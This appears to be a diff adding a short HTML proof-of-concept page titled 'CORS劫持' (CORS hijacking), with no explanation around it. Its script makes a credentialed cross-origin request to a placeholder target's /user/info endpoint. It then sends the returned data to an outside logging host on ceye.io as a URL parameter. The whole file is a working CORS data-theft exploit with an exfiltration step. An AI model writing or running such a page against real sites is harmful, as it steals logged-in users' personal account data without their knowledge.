@@ -1,0 +1,25 @@
+<html> 
+<head>
+<title>CORS劫持</title>
+<meta charset="utf-8">
+
+<body>
+<button type="button" onclick="cors()">Exploit</button>
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  $.get('http://aq5k8j.ceye.io?value='+this.responseText);
+	}
+	};
+  xhttp.open("GET", "http://xxx.xxx.xxx/user/info", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+
+</script>
+</body>
+
+</html>
